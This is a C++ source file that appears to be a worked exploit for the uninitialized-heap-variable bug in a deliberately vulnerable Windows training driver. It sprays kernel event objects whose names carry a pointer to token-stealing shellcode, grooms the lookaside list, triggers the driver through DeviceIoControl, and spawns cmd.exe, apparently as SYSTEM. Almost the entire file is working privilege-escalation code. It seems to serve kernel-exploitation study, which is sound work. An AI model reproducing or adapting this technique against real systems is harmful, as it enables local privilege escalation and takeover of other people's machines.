#include <windows.h>
#include <iostream>
#include <vector>
#include <cstdlib>
#include <string>

#include "Solutions.h"
#include "utils.h"
#include "UninitializedHeapVariable.h"

NTSTATUS Solutions::TriggerUninitializedHeapVariable() {
	SIZE_T dwBufSize = 4;
	DWORD dwBytesReturned = 0;
	PVOID lpInBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize);
	
	if (!lpInBuffer) {
		std::cout << "[-] Could not allocate memory" << std::endl;
		return STATUS_NO_MEMORY;
	}

	RtlCopyMemory(lpInBuffer, "BBBB", dwBufSize);

	WaitForLookAsideInit();

	AllocateEventObjects();
	std::cout << "[+] Allocated " << MAXIMUM_LAL_CHUNKS << " objects" << std::endl;

	freeEventObject();
	std::cout << "[+] Filled lookAsideList with eventObjects" << std::endl;
	
	if (!DeviceIoControl(_hDeviceHandle, IOCTL_UNINITIALIZED_HEAP_VARIABLE, lpInBuffer,
		dwBufSize, NULL, NULL, &dwBytesReturned, NULL)) {
		std::cout << "[-] could not interact with the driver" << std::endl;
		return STATUS_INVALID_PARAMETER;
	}
	
	system("cmd.exe");

	return 0;
}

static VOID helloWorld() {
	std::cout << "[!!!] Hello World" << std::endl;
}

static VOID AllocateEventObjects() {
	UINT32 i = 0;
	UCHAR eventName[ALLOCATION_KERNEL_SIZE] = { 0 };

	for (i = 0; i < MAXIMUM_LAL_CHUNKS; i++) {
		std::srand(i);
		
		GetObjectName(eventName ,(ULONG_PTR)&token_stealing_shellcode_write_what_where);

		HANDLE hCurrentEventHandle = CreateEventW(NULL, FALSE, FALSE, (LPCWSTR)eventName);
		
		if (!hCurrentEventHandle || GetLastError() == ERROR_ALREADY_EXISTS) {
			std::cout << "[-] could not get event object number " << i + 1 << ": " << GetLastError() << std::endl;
			return;
		}

		eventHandles.push_back(hCurrentEventHandle);
	}

	std::cout << "random handle: " << std::hex << eventHandles[190] << std::endl;
	std::cout << "random handle: " << std::hex << eventHandles[201] << std::endl;
	std::cout << "random handle: " << std::hex << eventHandles[220] << std::endl;
	
}

static VOID GetObjectName(UCHAR eventName[], ULONG_PTR payload) {
	UINT32 i = 0;

	for (i = 0; i < ALLOCATION_KERNEL_SIZE; i++) {
		eventName[i] = (CHAR)(0x41 + (std::rand() % (0x5A - 0x41))); // A - Z
	}

	*(PULONG)(eventName+ 4) = payload;

	eventName[ALLOCATION_KERNEL_SIZE - 1] = '\x00';
}

static VOID freeEventObject() {
	UINT32 i = 0;
	for (i = 0; i < MAXIMUM_LAL_CHUNKS; i++) {
		CloseHandle(eventHandles[i]);
	}
}

static VOID WaitForLookAsideInit() {
	DWORD dwWantedTickCount = 150000; // 1000 = 1 second -> 150000 = 150 seconds
	DWORD dwWillBeSleeping = 0;

	if (GetTickCount() < dwWantedTickCount) {
		dwWillBeSleeping = dwWantedTickCount - GetTickCount();
		std::cout << "[+] going to sleep for " << dwWillBeSleeping / 1000 << " seconds" << std::endl;

		Sleep(dwWillBeSleeping);
	}
	else {
		std::cout << "[+] We dont need to sleep!!" << std::endl;
	}
}